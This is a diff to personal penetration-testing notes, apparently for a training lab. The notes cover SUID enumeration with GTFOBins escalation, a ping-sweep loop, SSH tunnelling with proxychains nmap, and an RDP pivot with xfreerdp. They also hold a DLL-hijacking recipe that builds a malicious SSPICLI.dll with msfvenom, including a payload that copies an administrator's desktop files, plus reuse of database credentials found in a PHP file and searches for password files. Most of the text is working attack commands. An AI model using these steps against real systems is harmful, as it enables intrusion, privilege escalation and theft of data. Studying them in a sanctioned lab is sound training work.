@@ -142,15 +142,31 @@ STEP 6
 - find / -type f -perm /4000 -ls 2>/dev/null    : find suid only files
 - find / -type f -perm /2000 -ls 2>/dev/null    : find sgid only files
 - find / -type f -perm /6000 -ls 2>/dev/null    : find suid and sgid files
-- once you find the vulnerable command which is find
-- go to gtfo bins and see what you can run with it to give you escalation
-- from here you can now ping sweep the system and see a new box
+- once you find the field that gives you all the commands
+- go to gtfo bins and see what you commands have vulnerability that you can escalate with
+- from here you can now ping sweep the system and see a new box using the for i loop on the targets shell.        for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
 - now with this you should make a new tunnel to be able to enumerate on this box 
 - close your other dynamic tunnel, ssh -S /tmp/jmp ANYTHING -O cancel -D 9050
 - ssh -S /tmp/t3 -O forward -D 9050
 - proxychains nmap 192.168.28.189
 - you can see from this that rdp is open
-- 
+
+
+STEP 7
+
+
+-(run ssh -L in own term)
+ssh -p <portweusefortunnel> user3@127.0.0.1 -L newrhp:<targetip>:3389
+
+- (run rdp cmd in its own term)
+xfreerdp /u:Aaron /v:localhost:sameRHP /dynamic-resolution +clipboard
+
+- use aaron because we havent tried him yet
+- if it starts buggin out you can try and put that new mac address it gives you in the known hosts file like this 
+localhost 95:2a:fa:0a:22:50:42:8b:70:10:ef:f2:38:31:f6:51:2d:a4:70:a8
+127.0.0.1 95:2a:fa:0a:22:50:42:8b:70:10:ef:f2:38:31:f6:51:2d:a4:70:a8
+- or you can go back to the first tunnel connected to :3389 and just make a whole new rhp  
+- and use the password for aaron.
 
 
 
@@ -161,6 +177,26 @@ STEP 6
 
 
 
+DLL INJECTION/Hijacking
+- on rdp probably
+- in event you have process name putty
+- open procmon and use settings to see putty
+- download putty.exe from resources (put putty in its own folder)
+- start procmon --> do procmon /accepteula in cmdline
+- run putty
+- process    contains    putty
+- path    contains    .dll
+- result    is    NAME NOT FOUND
+- identify .dll to alter
+- probably be able to just skip this whole step cus we already know the dll is going to be SSPICLI.dll
+- msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll (SSPICLI.dll is what we are naming it)
+- msfvenom -p windows/exec CMD='xcopy C:\Users\Admin\Desktop\* C:\Users\comrade.WIN2-INTERNAL-D\Desktop' -f dll > SSPICLI.dll
+- msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+- once created SCP to your target box (either from the windows or from the linux box)
+- scp student@<linopip>:/home/student/SSPICLI.dll C:\Users\student\Documents\putty
+- scp from windows and pull from linbox. scp student@<jump ip>:/home/student/<dllname> C:\
+- now once the new dll is in the same folder then just run putty
+- we already know we are going to be targeting SSPICLI.dll (btw cus of sauce)
 
 
 
@@ -286,3 +322,7 @@ Passwd.txt Passwds.txt passwd.txt password.txt passwords.txt
 On the occasion that in one of the .php files you find a mysql user and pass. You can use it and go into mariadb. In this case it was in login.php and looked like this. $con = mysqli_connect('localhost:3306','webuser','sqlpass','session')
 With this we can run a command from our shell to open mariadb mysql --user=webuser --pass=sqlpass
 keep in mind of the rsylog directories
+* you can find web directories being posted in /var/www/html
+* if a question asks how many directories it has you should look in /var/www/html and count the directories
+* if it asks for kernel version the command is uname -a or uname -r ; answer would look like ( 4.15.0-213-generic )
+* find / -name <word of interest>* 2>/dev/null        example words of interest: password  creds  network  hosts  *sys*
